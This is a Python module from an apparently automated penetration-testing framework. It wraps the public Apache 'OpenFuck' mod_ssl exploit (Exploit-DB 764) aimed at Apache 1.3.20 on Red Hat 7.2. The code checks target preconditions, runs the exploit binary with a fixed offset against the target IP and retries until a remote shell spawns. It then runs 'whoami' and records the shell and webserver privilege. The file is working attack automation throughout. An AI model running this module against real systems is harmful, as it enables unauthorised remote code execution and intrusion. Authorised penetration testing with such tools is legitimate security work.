from pinaht.file_manager import FileManager
from pinaht.modules.module import Module
from pinaht.knowledge.manager import BufferedModuleManager
from pinaht.knowledge.precondition import Precondition, MetaPrecondition
from pinaht.knowledge.precondition_factory.preconditions import check_type, check_value, check_str, check_version
from pinaht.knowledge.precondition_factory.metapreconditions import is_parent, merge
from pinaht.knowledge.types.ipaddress import IPAddress
from pinaht.knowledge.types.knowledge import Knowledge
from pinaht.knowledge.types.operatingsystemtype import OperatingSystemType
from pinaht.knowledge.types.os import OS
from pinaht.knowledge.types.privilege import Privilege
from pinaht.knowledge.types.service import Service
from pinaht.knowledge.types.processshell import ProcessShell, ShellSpawnError
from pinaht.knowledge.types.target import Target
from pinaht.knowledge.types.user import User
from pinaht.knowledge.types.version import Version
from typing import Tuple, Dict
from pinaht.reporting.report_util import str_to_latex


class ApacheOpenfuckModule(Module):
    """
    Executes the Apache Openfuck exploit for Apache servers with an old `mod_ssl` module (version < 2.8.7).

    Exploit-DB: https://www.exploit-db.com/exploits/764
    """

    def __init__(self, manager, file_manager: FileManager, **kwargs):
        super().__init__(manager, **kwargs)

        self._file_manager = file_manager

        self._shell = None

        self.estimated_time = 10
        self.success_chance = 0.5

    def _generate_precondition_dnf(self) -> Dict[str, Tuple[Dict[str, Precondition], MetaPrecondition]]:
        """
        Generates the preconditions
        """
        # TODO: add mod_ssl version precondition
        target_precondition = check_type(Target)
        ip_address_precondition = check_type(IPAddress)
        os_precondition = check_type(OS)
        service_precondition = check_type(Service)
        os_type_precondition = check_value(OperatingSystemType.LINUX)
        service_name_precondition = check_str(lambda k: 1.0 if "apache" in str.lower(k) else 0.0)

        # TODO: add meta preconditions for other combinations
        return {
            "redhat-7.2_apache-1.3.20": (
                {
                    "target": target_precondition,
                    "ip_address": ip_address_precondition,
                    "os": os_precondition,
                    "os_type": os_type_precondition,
                    "service": service_precondition,
                    "service_name": service_name_precondition,
                    "version_1.3.20": check_version(
                        lambda v: v == Version(Version.parse_version("1.3.20")), lambda v: f"version {v!s} = 1.3.20"
                    ),
                },
                merge(
                    [
                        is_parent("target", ["ip_address", "os", "service"]),
                        is_parent("os", ["os_type"]),
                        is_parent("service", ["service_name", "version_1.3.20"]),
                    ]
                ),
            ),
        }

    def execute(
        self, buffered_module_manager: BufferedModuleManager, meta_key: str, keyed_knowledge: Dict[str, Knowledge]
    ):
        """
        Executes the exploit
        """

        buffered_module_manager.report(
            str_to_latex("Starting the Apache-Openfuck exploit based on https://www.exploit-db.com/exploits/764")
        )

        target = keyed_knowledge["target"]
        ip_address = keyed_knowledge["ip_address"]
        offset = None
        if meta_key == "redhat-7.2_apache-1.3.20":
            offset = "0x6b"
            buffered_module_manager.report(
                """Choosing parameters based on previous knowledge:
                \\code{redhat-7.2_apache-1.3.20} and offset \\code{0x6b}"""
            )
        exploit_path = self._file_manager.get_file_path(type(self).__name__, "openfuck")
        exploit_command = f"'{exploit_path}' {offset} {ip_address}"

        if offset is not None:

            def spawn_shell(retries=10):
                try:
                    self._logger.debug(f'running command "{exploit_command}"')
                    buffered_module_manager.report(f"running command \\code{{{str_to_latex(exploit_command)}}}")
                    self._shell = ProcessShell(exploit_command)
                except (ShellSpawnError):
                    if retries > 0:
                        self._logger.warning("spawning shell failed; retrying...")
                        spawn_shell(retries - 1)
                    else:
                        self._logger.error("spawning shell failed")

            spawn_shell()
            if self._shell is not None:
                self._logger.info("exploit succeeded")
                buffered_module_manager.report("Exploit successful. Remote shell opened.")
                buffered_module_manager.add_knowledge(self._shell, "privilege", Privilege.WEBSERVER, 1.0)
                buffered_module_manager.add_knowledge(
                    self._shell, "shelluser", User(self._shell.execute("whoami")[0]), 1.0
                )
                buffered_module_manager.add_knowledge(target, "shells", self._shell, 1.0)
            else:
                self._logger.error("exploit failed")
        else:
            self._logger.info("exploit incompatible with target")
